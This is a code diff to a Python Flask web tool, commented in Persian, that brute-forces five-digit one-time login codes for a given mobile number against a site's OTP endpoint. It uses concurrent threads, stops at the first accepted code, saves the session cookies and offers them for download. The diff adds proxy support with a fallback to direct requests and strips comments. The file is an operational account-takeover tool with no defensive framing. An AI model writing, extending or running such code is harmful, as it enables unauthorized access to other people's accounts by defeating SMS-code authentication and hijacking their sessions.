@@ -13,7 +13,6 @@ from datetime import datetime
 app = Flask(__name__)
 socketio = SocketIO(app)
 
-# متغیرهای گلوبال برای کنترل پروسه و وضعیت
 running = False
 found_success = False
 progress_log = []
@@ -23,11 +22,10 @@ current_status = {
     "processed": 0,
     "error": None
 }
-last_cookie_file = None  # برای ذخیره مسیر آخرین فایل کوکی
-stop_event = threading.Event()  # برای توقف فوری همه نخ‌ها
+last_cookie_file = None
+stop_event = threading.Event()
 
 def save_cookies(cookies, code_str):
-    """ذخیره کوکی‌ها و برگردوندن لینک"""
     global last_cookie_file
     timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
     cookies_file = f"cookies_success_{code_str}_{timestamp}.txt"
@@ -39,15 +37,15 @@ def save_cookies(cookies, code_str):
     
     if os.path.exists(cookies_file) and os.path.getsize(cookies_file) > 0:
         progress_log.append(f"Cookies saved in {cookies_file}")
-        print(f"Cookies saved in {cookies_file}")  # لاگ به ترمینال
+        print(f"Cookies saved in {cookies_file}")
         last_cookie_file = cookies_file
         return True
     else:
         progress_log.append(f"Error: Failed to save cookies to {cookies_file}")
-        print(f"Error: Failed to save cookies to {cookies_file}")  # لاگ به ترمینال
+        print(f"Error: Failed to save cookies to {cookies_file}")
         return False
 
-def send_request(host, login_otp_nonce, mobile, code_values, counter, max_retries=5):
+def send_request(host, login_otp_nonce, mobile, code_values, counter, proxy="", max_retries=5):
     global current_status, last_cookie_file, found_success, running
     headers = {
         "Host": host,
@@ -83,41 +81,54 @@ def send_request(host, login_otp_nonce, mobile, code_values, counter, max_retrie
     code_str = ''.join(map(str, code_values))
 
     for attempt in range(max_retries + 1):
-        if stop_event.is_set():  # اگه موفقیت پیدا شده، متوقف شو
+        if stop_event.is_set():
             return False
         try:
-            response = requests.post(url, headers=headers, data=data, timeout=15)
-            response.raise_for_status()
+            if proxy:  # اگه پروکسی باشه، اول با پروکسی امتحان کن
+                proxies = {"http": proxy, "https": proxy}
+                try:
+                    response = requests.post(url, headers=headers, data=data, proxies=proxies, timeout=15)
+                    response.raise_for_status()
+                except requests.exceptions.RequestException as proxy_error:
+                    # اگه پروکسی کار نکرد (مثلاً SSL یا هر خطای دیگه)، بدون پروکسی بفرست
+                    progress_log.append(f"Proxy failed for code {code_str} (attempt {attempt + 1}): {str(proxy_error)}. Retrying without proxy...")
+                    print(f"Proxy failed: {str(proxy_error)}. Retrying without proxy...")
+                    response = requests.post(url, headers=headers, data=data, timeout=15)
+                    response.raise_for_status()
+            else:  # بدون پروکسی
+                response = requests.post(url, headers=headers, data=data, timeout=15)
+                response.raise_for_status()
+
             try:
                 json_response = response.json()
-                print(f"Response for code {code_str}: {json_response}")  # لاگ پاسخ سرور
+                print(f"Response for code {code_str}: {json_response}")
                 if json_response.get("success"):
                     msg = (f"Success with code {code_str} (number {counter})!\n"
                            f"Message: {json_response['data']['message']}\n"
                            f"Redirect to: {json_response['data']['redirect']}")
                     progress_log.append(msg)
-                    print(msg)  # لاگ به ترمینال
+                    print(msg)
                     save_cookies(response.cookies, code_str)
                     timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
                     output_file = f"success_{code_str}_{timestamp}.txt"
                     with open(output_file, 'w', encoding='utf-8') as f:
                         f.write(msg + "\nLast cookie file will be available after process stops.\n")
                     progress_log.append(f"Output saved in {output_file}")
-                    print(f"Output saved in {output_file}")  # لاگ به ترمینال
+                    print(f"Output saved in {output_file}")
                     current_status["error"] = f"Code {code_str} found successfully!"
                     current_status["running"] = False
                     found_success = True
                     running = False
-                    stop_event.set()  # سیگنال توقف به همه نخ‌ها
+                    stop_event.set()
                     return True
                 else:
                     progress_log.append(f"Failed with code {code_str} (number {counter}): {json_response}")
-                    print(f"Failed with code {code_str} (number {counter}): {json_response}")  # لاگ به ترمینال
+                    print(f"Failed with code {code_str} (number {counter}): {json_response}")
                     current_status["processed"] = counter
                     return False
             except json.JSONDecodeError:
                 progress_log.append(f"Error parsing JSON for code {code_str} (number {counter})")
-                print(f"Error parsing JSON for code {code_str} (number {counter})")  # لاگ به ترمینال
+                print(f"Error parsing JSON for code {code_str} (number {counter})")
                 current_status["error"] = "JSON parsing error"
                 return False
         except requests.exceptions.RequestException as e:
@@ -130,7 +141,7 @@ def send_request(host, login_otp_nonce, mobile, code_values, counter, max_retrie
                 elif e.response.status_code == 503:
                     error_msg = "Server unavailable (503)"
             progress_log.append(f"Network error with code {code_str} (attempt {attempt + 1}/{max_retries + 1}): {error_msg}")
-            print(f"Network error with code {code_str} (attempt {attempt + 1}/{max_retries + 1}): {error_msg}")  # لاگ به ترمینال
+            print(f"Network error with code {code_str} (attempt {attempt + 1}/{max_retries + 1}): {error_msg}")
             current_status["error"] = error_msg
             if attempt < max_retries:
                 time.sleep(2)
@@ -141,11 +152,11 @@ def generate_code(counter):
     code_str = f"{counter:05d}"
     return [int(digit) for digit in code_str]
 
-def run_bruteforce(host, login_otp_nonce, mobile, connections, start_range, end_range):
+def run_bruteforce(host, login_otp_nonce, mobile, connections, start_range, end_range, proxy):
     global running, found_success, current_status
-    stop_event.clear()  # ریست سیگنال توقف
+    stop_event.clear()
     progress_log.append(f"Starting bruteforce from {start_range} to {end_range}...")
-    print(f"Starting bruteforce from {start_range} to {end_range}...")  # لاگ به ترمینال
+    print(f"Starting bruteforce from {start_range} to {end_range}...")
     current_status = {
         "running": True,
         "current_range": {"start": start_range, "end": end_range},
@@ -158,15 +169,15 @@ def run_bruteforce(host, login_otp_nonce, mobile, connections, start_range, end_
     for batch_start in range(start_range, end_range, batch_size):
         if not running or found_success or stop_event.is_set():
             if found_success or stop_event.is_set():
-                cookie_link = f"http://{request.host}/last_cookie"  # لینک توی context اصلی
+                cookie_link = f"http://{request.host}/last_cookie"
                 success_msg = (f"Code found successfully! Process stopped.\n"
                                f"Last cookie: {cookie_link}")
                 progress_log.append(success_msg)
-                print(success_msg)  # لاگ به ترمینال
+                print(success_msg)
                 current_status["error"] = success_msg
             else:
                 progress_log.append("Process stopped manually!")
-                print("Process stopped manually!")  # لاگ به ترمینال
+                print("Process stopped manually!")
             current_status["running"] = False
             break
 
@@ -175,7 +186,7 @@ def run_bruteforce(host, login_otp_nonce, mobile, connections, start_range, end_
 
         with ThreadPoolExecutor(max_workers=connections) as executor:
             futures = {
-                executor.submit(send_request, host, login_otp_nonce, mobile, code, batch_start + idx + 1): idx
+                executor.submit(send_request, host, login_otp_nonce, mobile, code, batch_start + idx + 1, proxy): idx
                 for idx, code in enumerate(codes)
             }
 
@@ -184,14 +195,14 @@ def run_bruteforce(host, login_otp_nonce, mobile, connections, start_range, end_
                     if future.result():
                         found_success = True
                         running = False
-                        break  # توقف حلقه داخلی
+                        break
                 except Exception as e:
                     progress_log.append(f"Exception in future: {str(e)}")
-                    print(f"Exception in future: {str(e)}")  # لاگ به ترمینال
+                    print(f"Exception in future: {str(e)}")
                     current_status["error"] = str(e)
 
         if found_success or stop_event.is_set():
-            break  # توقف حلقه اصلی
+            break
 
         current_status["processed"] = batch_end
         if not found_success:
@@ -199,9 +210,8 @@ def run_bruteforce(host, login_otp_nonce, mobile, connections, start_range, end_
 
     if not found_success:
         progress_log.append(f"No successful code found in range {start_range:05d}-{end_range:05d}.")
-        print(f"No successful code found in range {start_range:05d}-{end_range:05d}.")  # لاگ به ترمینال
+        print(f"No successful code found in range {start_range:05d}-{end_range:05d}.")
         current_status["running"] = False
-    # ریست برای کار بعدی
     running = False
     found_success = False
 
@@ -215,32 +225,31 @@ def start():
     connections = int(data['connections'])
     start_range = int(data['startRange'])
     end_range = int(data['endRange'])
+    proxy = data.get('proxy', '')
 
     running = True
     found_success = False
     progress_log = []
     progress_log.append("Start button clicked!")
-    print("Start button clicked!")  # لاگ به ترمینال
-    threading.Thread(target=run_bruteforce, args=(host, login_otp_nonce, mobile, connections, start_range, end_range)).start()
+    print("Start button clicked!")
+    threading.Thread(target=run_bruteforce, args=(host, login_otp_nonce, mobile, connections, start_range, end_range, proxy)).start()
     return '', 204
 
 @app.route('/stop', methods=['POST'])
 def stop():
     global running
     running = False
-    stop_event.set()  # سیگنال توقف دستی
+    stop_event.set()
     progress_log.append("Stop button clicked!")
-    print("Stop button clicked!")  # لاگ به ترمینال
+    print("Stop button clicked!")
     return '', 204
 
 @app.route('/status', methods=['GET'])
 def status():
-    """برگشت وضعیت فعلی ورکر"""
     return jsonify(current_status)
 
 @app.route('/last_cookie', methods=['GET'])
 def last_cookie():
-    """نمایش یا دانلود آخرین فایل کوکی"""
     global last_cookie_file
     if last_cookie_file and os.path.exists(last_cookie_file):
         return send_file(last_cookie_file, as_attachment=True, download_name=os.path.basename(last_cookie_file))
